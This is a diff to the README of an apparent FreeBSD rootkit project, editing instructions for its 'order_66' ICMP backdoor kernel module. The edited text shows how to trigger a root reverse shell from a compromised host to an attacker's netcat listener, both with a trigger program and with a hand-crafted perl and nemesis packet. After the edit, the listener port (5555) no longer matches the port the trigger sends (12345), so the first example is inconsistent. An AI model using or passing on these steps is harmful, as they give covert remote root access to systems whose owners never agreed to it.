@@ -1,5 +1,5 @@
 # kld-rootkit
-## A collection of FreeBSD rootkit kernel modules and utilities
+## A collection of FreeBSD 13 rootkit kernel modules and utilities
 
 **TL;DR ./install_rootkit.sh -s**
 
@@ -137,16 +137,12 @@ To trigger the order_66 backdoor icmp_input hook we need to send an ICMP packet 
  5. The port that the listener is on
  
 netcat (nc) can be used to listen for the inbound connection
- 
-#### Example:
- 
-For a reverse shell to our target running the order_66 kernel module on *192.168.1.123*
- 
-Start a listener with netcat on *192.168.1.250* and port *12345*
 
-    nc -lnvp 12345
+For a reverse shell to our target running the order_66 kernel module on *192.168.1.123* start a listener with netcat on *192.168.1.250* and port *5555*
 
-From anywhere, run the trigger program:
+    nc -lnvp 5555
+
+To activate the backdoor from any FreeBSD system, run the trigger program:
 
     ./bin/trigger 192.168.1.123 192.168.1.250 12345
 
@@ -156,17 +152,13 @@ Alternatively, perl can be used to craft the packet's data buffer and [ nemesis 
 
 #### Example:
 
-For a reverse shell to *192.168.1.123*
-
-From *192.168.1.250*, run:
-
-    nc -lnvp 5555
-
 From anywhere run:
 
     echo "z4xX0n" > /tmp/payload
     perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
     nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
+
+From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
 
 ### Persistence
 
